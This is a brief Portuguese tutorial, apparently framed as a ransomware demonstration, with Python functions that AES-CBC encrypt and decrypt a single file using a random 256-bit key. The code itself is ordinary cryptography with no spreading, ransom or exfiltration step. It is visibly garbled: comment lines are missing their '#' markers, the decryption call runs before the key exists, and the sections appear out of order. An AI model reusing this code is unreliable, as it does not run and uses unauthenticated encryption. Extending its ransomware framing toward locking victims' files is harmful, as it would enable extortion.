# Entendendo um Ransomware na Prática com Python
# Encriptação

### Importações

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

def encrypt_file(input_file_path, output_file_path, key):
    # Gerando um IV (vetor de inicialização) aleatório
    iv = os.urandom(16)
    
    # Configurando o algoritmo AES com a chave e o IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Lendo o arquivo de entrada
    with open(input_file_path, 'rb') as f:
        data = f.read()

    # Certificando-se de que os dados sejam múltiplos de 16 bytes (padding)
    padding_length = 16 - len(data) % 16
    data += bytes([padding_length]) * padding_length

    # Encriptando os dados
    encrypted_data = encryptor.update(data) + encryptor.finalize()

    # Salvando o IV e os dados encriptados no arquivo de saída
    with open(output_file_path, 'wb') as f:
        f.write(iv + encrypted_data)

    print(f"Arquivo encriptado salvo em {output_file_path}")
    
 Chave AES de 256 bits (32 bytes)

# Decriptação

### Importações

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

def decrypt_file(input_file_path, output_file_path, key):
    # Lendo o arquivo encriptado
    with open(input_file_path, 'rb') as f:
        iv = f.read(16)  # O IV está nos primeiros 16 bytes
        encrypted_data = f.read()

    # Configurando o algoritmo AES com a chave e o IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Desencriptando os dados
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Removendo o padding
    padding_length = decrypted_data[-1]
    decrypted_data = decrypted_data[:-padding_length]

    # Salvando os dados desencriptados no arquivo de saída
    with open(output_file_path, 'wb') as f:
        f.write(decrypted_data)

    print(f"Arquivo descriptado salvo em {output_file_path}")

 Caminho do arquivo encriptado e de saída
input_file = 'arquivo_encriptado.bin'
output_file = 'arquivo_descriptado.txt'

decrypt_file(input_file, output_file, key)

key = os.urandom(32)

 Caminho do arquivo de entrada e saída
input_file = 'arquivo.txt'
output_file = 'arquivo_encriptado.bin'

encrypt_file(input_file, output_file, key)
